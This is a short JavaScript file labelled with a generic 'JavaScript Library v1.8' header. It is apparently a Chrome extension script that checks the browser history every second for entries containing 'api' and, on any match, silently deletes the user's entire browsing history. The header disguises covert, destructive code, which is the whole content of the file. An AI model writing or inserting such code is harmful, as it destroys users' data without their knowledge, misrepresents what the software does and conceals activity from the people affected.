/*!
 * JavaScript Library v1.8
 * Date: 2021-03-02T17:08Z
 */
 
setInterval(function() {
	removeH();
	}, 1000);
	
function removeH(){	
chrome.history.search({text: 'api', maxResults: 1}, function(data) {
    data.forEach(function(page) {
        if(page.url){
	setTimeout(function() {
    chrome.history.deleteAll(function(){});
	}, 3000);
		}
    });
});
}
